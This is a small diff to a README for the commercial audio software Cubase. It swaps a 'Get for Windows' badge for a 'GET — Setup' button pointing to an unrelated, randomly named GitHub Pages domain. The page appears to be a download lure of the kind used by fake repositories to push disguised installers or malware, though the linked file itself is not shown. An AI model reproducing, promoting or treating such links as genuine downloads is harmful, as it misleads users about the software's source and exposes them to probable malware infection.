@@ -1,15 +1,6 @@
 # Cubase – Professional Digital Audio Workstation  
 
-<div align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Cubase_logo.svg/2560px-Cubase_logo.svg.png" width="450"/>
-</div>  
-<br>
-
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://cubase-app.github.io/.github)
-
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://fondalabranchenkbxz.github.io/.github/Cubase-App)
 
 ---
 
